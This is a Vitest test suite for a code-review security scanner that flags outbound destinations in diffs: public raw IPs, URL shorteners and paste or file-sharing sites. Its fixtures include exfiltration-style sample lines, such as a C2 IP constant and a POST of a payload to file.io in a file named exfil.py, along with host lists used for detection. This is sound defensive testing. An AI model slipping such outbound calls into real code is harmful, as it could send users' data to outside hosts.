import { describe, it, expect } from "vitest";
import {
  scanFileWithOutboundRules,
  runOutboundSecurityRules,
  checkLineForOutboundDestinations,
  OUTBOUND_RULE_IDS,
  URL_SHORTENER_HOSTS,
  PASTE_SITE_HOSTS,
} from "./outbound-rules";

function makePatch(addedLine: string): string {
  return `@@ -1,1 +1,2 @@\n context\n+${addedLine}`;
}

function makeRemovedPatch(line: string): string {
  return `@@ -1,2 +1,1 @@\n context\n-${line}`;
}

describe("Outbound Destination Detection Rules (#2091)", () => {
  describe("SEC_OUTBOUND_RAW_IP – raw IP addresses", () => {
    it("flags a public IPv4 address in added code", () => {
      const findings = scanFileWithOutboundRules("src/config.ts", makePatch('const C2 = "198.51.100.1";'));
      const rawIp = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS);
      expect(rawIp).toBeDefined();
      expect(rawIp?.severity).toBe("MEDIUM");
      expect(rawIp?.description).toContain("198.51.100.1");
    });

    it("does NOT flag private RFC-1918 addresses", () => {
      const lines = [
        'const host = "192.168.1.100";',
        'const mgmt = "10.0.0.1";',
        'const vpn = "172.16.0.1";',
        'const local = "127.0.0.1";',
      ];
      for (const line of lines) {
        const findings = scanFileWithOutboundRules("src/net.ts", makePatch(line));
        const rawIp = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS);
        expect(rawIp, `Expected no finding for '${line}'`).toHaveLength(0);
      }
    });

    it("does NOT flag IPs on removed lines", () => {
      const findings = scanFileWithOutboundRules("src/net.ts", makeRemovedPatch('const c2 = "198.51.100.42";'));
      expect(findings).toHaveLength(0);
    });

    it("respects allowedHosts for IPs", () => {
      const findings = scanFileWithOutboundRules(
        "src/config.ts",
        makePatch('const host = "1.2.3.4";'),
        { allowedHosts: ["1.2.3.4"] },
      );
      expect(findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS)).toHaveLength(0);
    });
  });

  describe("SEC_OUTBOUND_URL_SHORTENER – URL shorteners", () => {
    it("flags bit.ly URL", () => {
      const findings = scanFileWithOutboundRules("src/app.js", makePatch('fetch("https://bit.ly/3xAbc12")'));
      const shortener = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
      expect(shortener).toBeDefined();
      expect(shortener?.severity).toBe("MEDIUM");
      expect(shortener?.description).toContain("bit.ly");
    });

    it("flags tinyurl.com URL", () => {
      const findings = scanFileWithOutboundRules("scripts/run.sh", makePatch('curl https://tinyurl.com/abc123'));
      expect(findings.some((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER)).toBe(true);
    });

    it("masks credentials in URL in description", () => {
      const findings = scanFileWithOutboundRules("src/app.js", makePatch('fetch("https://user:pass@bit.ly/abc")'));
      const shortener = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
      expect(shortener?.description).not.toContain("pass");
      expect(shortener?.description).toContain("***@");
    });

    it("does NOT flag normal HTTPS URLs to known domains", () => {
      const findings = scanFileWithOutboundRules("src/api.ts", makePatch('fetch("https://api.github.com/repos")'));
      const shorteners = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
      expect(shorteners).toHaveLength(0);
    });
  });

  describe("SEC_OUTBOUND_PASTE_SITE – paste / file-sharing sites", () => {
    it("flags pastebin.com URL", () => {
      const findings = scanFileWithOutboundRules("src/bootstrap.py", makePatch('url = "https://pastebin.com/raw/abc123"'));
      const paste = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE);
      expect(paste).toBeDefined();
      expect(paste?.severity).toBe("MEDIUM");
      expect(paste?.description).toContain("pastebin.com");
    });

    it("flags file.io URL", () => {
      const findings = scanFileWithOutboundRules("src/exfil.py", makePatch('requests.post("https://file.io", data=payload)'));
      expect(findings.some((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE)).toBe(true);
    });

    it("does NOT flag paste sites on removed lines", () => {
      const findings = scanFileWithOutboundRules("src/old.py", makeRemovedPatch('url = "https://pastebin.com/raw/xyz"'));
      expect(findings).toHaveLength(0);
    });

    it("respects allowedHosts for paste sites", () => {
      const findings = scanFileWithOutboundRules(
        "src/config.py",
        makePatch('url = "https://pastebin.com/raw/abc"'),
        { allowedHosts: ["pastebin.com"] },
      );
      expect(findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE)).toHaveLength(0);
    });
  });

  describe("disabledRules and enabled flag", () => {
    it("respects disabledRules: suppresses URL_SHORTENER rule only", () => {
      const findings = scanFileWithOutboundRules(
        "src/app.js",
        makePatch('fetch("https://bit.ly/abc"); const ip = "198.51.100.1";'),
        { disabledRules: ["SEC_OUTBOUND_URL_SHORTENER"] },
      );
      const shorteners = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
      const ips = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS);
      expect(shorteners).toHaveLength(0);
      expect(ips.length).toBeGreaterThanOrEqual(1);
    });

    it("respects enabled: false to suppress all", () => {
      const findings = runOutboundSecurityRules(
        [{ filename: "src/app.js", patch: makePatch('fetch("https://pastebin.com/x")') }],
        { enabled: false },
      );
      expect(findings).toHaveLength(0);
    });
  });

  describe("runOutboundSecurityRules – multi-file", () => {
    it("collects findings from all files", () => {
      const files = [
        { filename: "src/a.js", patch: makePatch('fetch("https://bit.ly/abc")') },
        { filename: "src/b.py", patch: makePatch('url = "https://pastebin.com/raw/xyz"') },
      ];
      const findings = runOutboundSecurityRules(files);
      expect(findings.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe("Host lists are data files with tests for matching", () => {
    it("URL_SHORTENER_HOSTS contains bit.ly, t.co, tinyurl.com", () => {
      expect(URL_SHORTENER_HOSTS.has("bit.ly")).toBe(true);
      expect(URL_SHORTENER_HOSTS.has("t.co")).toBe(true);
      expect(URL_SHORTENER_HOSTS.has("tinyurl.com")).toBe(true);
    });

    it("PASTE_SITE_HOSTS contains pastebin.com, file.io, hastebin.com", () => {
      expect(PASTE_SITE_HOSTS.has("pastebin.com")).toBe(true);
      expect(PASTE_SITE_HOSTS.has("file.io")).toBe(true);
      expect(PASTE_SITE_HOSTS.has("hastebin.com")).toBe(true);
    });
  });
});
